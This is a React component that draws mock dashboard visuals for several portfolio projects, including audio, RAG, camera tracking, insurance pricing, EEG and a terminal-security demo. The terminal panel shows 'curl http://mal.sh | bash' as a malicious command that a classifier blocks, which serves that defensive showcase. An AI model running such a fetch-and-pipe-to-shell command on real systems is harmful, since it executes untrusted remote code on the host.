"use client";

import React, { useEffect, useState } from "react";

interface MiniProjectVisualProps {
  type: "audio-waveform" | "rag-flow" | "camera-tracking" | "terminal-security" | "pricing-matrix" | "eeg-waves";
}

export function MiniProjectVisual({ type }: MiniProjectVisualProps) {
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    setMounted(true);
  }, []);

  if (!mounted) {
    return <div className="h-44 bg-slate-950/60 rounded border border-slate-800" />;
  }

  // 1. Audio Waveform (Literacy Platform)
  if (type === "audio-waveform") {
    return (
      <div className="h-44 bg-slate-950/80 rounded border border-slate-800 p-4 flex flex-col justify-between relative overflow-hidden font-mono">
        <div className="flex items-center justify-between text-[10px] text-slate-500">
          <span className="flex items-center gap-1.5 text-emerald-400">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
            MIC_STREAM // 16kHz PCM
          </span>
          <span className="text-cyan-400">OLLAMA_TOKEN_STREAM: OK</span>
        </div>

        {/* Dynamic Equalizer Bars */}
        <div className="flex items-end justify-center gap-1.5 h-20 my-auto">
          {[35, 60, 95, 45, 80, 100, 70, 50, 85, 40, 90, 65, 30, 75, 95, 50, 80, 45].map(
            (height, i) => (
              <div
                key={i}
                className="w-1.5 bg-gradient-to-t from-emerald-600 to-emerald-300 rounded-t transition-all duration-300 animate-pulse"
                style={{
                  height: `${height}%`,
                  animationDelay: `${(i * 70) % 500}ms`,
                  animationDuration: "1.2s",
                }}
              />
            )
          )}
        </div>

        <div className="flex items-center justify-between text-[9px] text-slate-500 border-t border-slate-800/80 pt-1">
          <span>PHONETIC_SCORE: 96.4%</span>
          <span className="text-emerald-400">DUPLEX_SOCKET: ACTIVE</span>
        </div>
      </div>
    );
  }

  // 2. RAG Flow (Student Support Voicebot)
  if (type === "rag-flow") {
    return (
      <div className="h-44 bg-slate-950/80 rounded border border-slate-800 p-3 flex flex-col justify-between relative overflow-hidden font-mono">
        <div className="flex items-center justify-between text-[10px] text-slate-500">
          <span className="text-cyan-400">PGVECTOR_SIMILARITY: 0.942</span>
          <span className="text-slate-400">LANGCHAIN_RETRIEVAL</span>
        </div>

        {/* Node Connection Mock */}
        <div className="my-auto grid grid-cols-3 gap-2 items-center text-center text-[10px]">
          <div className="p-2 rounded bg-slate-900 border border-slate-700 text-slate-300">
            <div className="text-[9px] text-slate-500">QUERY</div>
            <div className="text-emerald-400 truncate">Attendance?</div>
          </div>
          <div className="flex flex-col items-center justify-center text-slate-600">
            <span className="text-[10px] text-cyan-400 animate-pulse">--&gt; RAG --&gt;</span>
            <span className="text-[8px] text-slate-500">pgvector chunk</span>
          </div>
          <div className="p-2 rounded bg-emerald-950/30 border border-emerald-800/50 text-slate-200">
            <div className="text-[9px] text-slate-400">ERP RECORD</div>
            <div className="text-emerald-300 font-bold">94.8% (OK)</div>
          </div>
        </div>

        <div className="flex items-center justify-between text-[9px] text-slate-500 border-t border-slate-800/80 pt-1">
          <span>OAUTH: AUTHENTICATED</span>
          <span className="text-cyan-400">TTS_SPEECH: SYNTHESIZED</span>
        </div>
      </div>
    );
  }

  // 3. Camera Tracking (YOLOv8 + ByteTrack)
  if (type === "camera-tracking") {
    return (
      <div className="h-44 bg-slate-950/80 rounded border border-slate-800 p-3 flex flex-col justify-between relative overflow-hidden font-mono">
        <div className="flex items-center justify-between text-[10px] text-slate-500">
          <span className="flex items-center gap-1.5 text-rose-400">
            <span className="w-1.5 h-1.5 rounded-full bg-rose-500 animate-ping" />
            CAM_04 // RTSP_FEED
          </span>
          <span className="text-emerald-400">YOLOv8: 48 FPS</span>
        </div>

        {/* Video Frame Bounding Box Graphic */}
        <div className="relative my-auto h-20 border border-slate-800 rounded bg-slate-900/40 overflow-hidden">
          {/* Tracking box */}
          <div className="absolute left-1/4 top-2 w-28 h-16 border-2 border-emerald-400 rounded-sm bg-emerald-500/10 flex flex-col justify-between p-1">
            <div className="text-[8px] text-emerald-300 font-bold bg-black/70 px-1 py-0.2 rounded w-fit">
              ID: 042 // PERSON 98%
            </div>
            <div className="text-[8px] text-cyan-400 self-end bg-black/70 px-1 rounded">
              DWELL: 04m 12s
            </div>
          </div>

          {/* Polygon Zone lines */}
          <div className="absolute right-3 top-3 bottom-3 w-16 border border-dashed border-amber-500/50 bg-amber-500/5 flex items-center justify-center">
            <span className="text-[8px] text-amber-400">ZONE_B</span>
          </div>
        </div>

        <div className="flex items-center justify-between text-[9px] text-slate-500 border-t border-slate-800/80 pt-1">
          <span>BYTETRACK: ACTIVE</span>
          <span className="text-emerald-400">ZONE_TRANSITIONS: 12</span>
        </div>
      </div>
    );
  }

  // 4. Terminal Security (SafeExec)
  if (type === "terminal-security") {
    return (
      <div className="h-44 bg-slate-950/80 rounded border border-slate-800 p-3 flex flex-col justify-between relative overflow-hidden font-mono">
        <div className="flex items-center justify-between text-[10px] text-slate-500">
          <span className="text-rose-400">SAFEEXEC // BASH_TRAP</span>
          <span className="text-amber-400">eBPF_TRACE: HOOKED</span>
        </div>

        {/* Simulated Command Evaluation */}
        <div className="my-auto space-y-1.5 text-[10px]">
          <div className="flex items-center gap-1.5 text-slate-400">
            <span className="text-emerald-400">&gt;</span>
            <span className="text-rose-300 font-bold">curl http://mal.sh | bash</span>
          </div>
          <div className="p-1.5 rounded bg-rose-950/30 border border-rose-800/50 text-rose-300 text-[9px] flex items-center justify-between">
            <span>[INTERCEPT] XGBoost Score: 0.98 (MALICIOUS)</span>
            <span className="font-bold text-rose-400 bg-rose-950 px-1 py-0.5 rounded">BLOCKED</span>
          </div>
        </div>

        <div className="flex items-center justify-between text-[9px] text-slate-500 border-t border-slate-800/80 pt-1">
          <span>AST_PARSE: DETECTED_PIPE</span>
          <span className="text-emerald-400">HOST_DEFENSE: OK</span>
        </div>
      </div>
    );
  }

  // 5. Pricing Matrix (Gig-Worker Insurance)
  if (type === "pricing-matrix") {
    return (
      <div className="h-44 bg-slate-950/80 rounded border border-slate-800 p-3 flex flex-col justify-between relative overflow-hidden font-mono">
        <div className="flex items-center justify-between text-[10px] text-slate-500">
          <span className="text-cyan-400">GUIDEWIRE_PARAMETRIC</span>
          <span className="text-emerald-400">DIAMOND_TIER</span>
        </div>

        {/* Parametric Curve Visual */}
        <div className="my-auto flex items-center justify-around text-center">
          <div className="space-y-0.5">
            <div className="text-[9px] text-slate-500">WEATHER TRIGGER</div>
            <div className="text-xs text-amber-400 font-bold">&gt;65mm Rain</div>
            <div className="text-[8px] text-emerald-400">STATUS: MET</div>
          </div>
          <div className="text-xl text-slate-600">→</div>
          <div className="space-y-0.5">
            <div className="text-[9px] text-slate-500">INSTANT DISBURSE</div>
            <div className="text-xs text-emerald-400 font-bold">AUTO_PAYOUT</div>
            <div className="text-[8px] text-slate-400">FRAUD_SCORE: 0.02</div>
          </div>
        </div>

        <div className="flex items-center justify-between text-[9px] text-slate-500 border-t border-slate-800/80 pt-1">
          <span>DOCKER_CONTAINERS: 5/5</span>
          <span className="text-cyan-400">API_GATEWAY: HEALTHY</span>
        </div>
      </div>
    );
  }

  // 6. EEG Waves (NeuroHack)
  return (
    <div className="h-44 bg-slate-950/80 rounded border border-slate-800 p-3 flex flex-col justify-between relative overflow-hidden font-mono">
      <div className="flex items-center justify-between text-[10px] text-slate-500">
        <span className="text-emerald-400">DREAMER_14CH // 128Hz</span>
        <span className="text-cyan-400">SVM_RBF // F1_OPTIMIZED</span>
      </div>

      {/* Simulated Sine EEG traces */}
      <div className="my-auto space-y-1.5">
        <div className="flex items-center gap-2">
          <span className="text-[8px] text-slate-500 w-8">AF3</span>
          <div className="flex-1 h-3 flex items-center gap-1 overflow-hidden">
            {[4, 10, 2, 8, 14, 6, 2, 11, 7, 3, 12, 15, 5, 2, 9, 13, 6, 3, 8].map((v, i) => (
              <span
                key={i}
                className="w-1 bg-emerald-400/80 rounded-full inline-block transition-all"
                style={{ height: `${v}px` }}
              />
            ))}
          </div>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-[8px] text-slate-500 w-8">FP1</span>
          <div className="flex-1 h-3 flex items-center gap-1 overflow-hidden">
            {[8, 3, 12, 6, 2, 9, 14, 5, 2, 11, 15, 7, 4, 10, 3, 8, 12, 4].map((v, i) => (
              <span
                key={i}
                className="w-1 bg-cyan-400/80 rounded-full inline-block transition-all"
                style={{ height: `${v}px` }}
              />
            ))}
          </div>
        </div>
      </div>

      <div className="flex items-center justify-between text-[9px] text-slate-500 border-t border-slate-800/80 pt-1">
        <span>PREDICTED: HIGH_VALENCE</span>
        <span className="text-emerald-400">BANDPOWER_DE: EXTRACTED</span>
      </div>
    </div>
  );
}
